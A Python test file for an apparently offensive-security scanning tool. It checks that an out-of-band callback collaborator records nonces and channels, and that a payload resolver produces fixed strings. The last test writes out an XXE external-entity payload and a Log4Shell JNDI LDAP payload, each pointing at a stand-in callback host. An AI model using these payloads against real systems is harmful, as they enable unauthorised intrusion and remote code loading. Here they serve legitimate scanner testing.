"""Multi-channel OOB callback evidence (D1) — additive enrichment, observed_nonces unchanged."""

from __future__ import annotations

from reachagent.oob.collaborator import InteractshCollaborator, OOBCollaborator

# -- D1 parsing-only: the collaborator tags each interaction with its channel ---


def test_collaborator_records_channel_with_interaction() -> None:
    c = InteractshCollaborator(base_domain="oob.test.internal")
    c.record_interaction("n1", "http")
    c.record_interaction("n2", "dns")
    # Nonces unchanged (blast-radius guard).
    assert c.observed_nonces() == frozenset({"n1", "n2"})
    # Channel enrichment is additive alongside.
    assert c.observed_channels() == frozenset({("n1", "http"), ("n2", "dns")})
    # Default channel keeps existing record_interaction(nonce) callers working.
    c.record_interaction("n3")
    assert c.observed_channels() == frozenset({("n1", "http"), ("n2", "dns"), ("n3", "dns")})


def test_collaborator_still_satisfies_protocol() -> None:
    c = InteractshCollaborator(base_domain="oob.test.internal")
    assert isinstance(c, OOBCollaborator)


# -- Phase 2a OOB templates unchanged, richer evidence when channel fires --------


def test_phase2a_oob_templates_resolve_identically() -> None:
    from reachagent.payloads.payload_resolver import resolve

    assert resolve("sqli_blind/oob-xxe-exfil", nonce="ra-x", collab="oob.example") == (
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ra-x.oob.example/xxe">]>'
    )
    assert resolve("command_injection/log4shell-oob", nonce="ra-l", collab="oob.example") == (
        "${jndi:ldap://ra-l.oob.example/a}"
    )
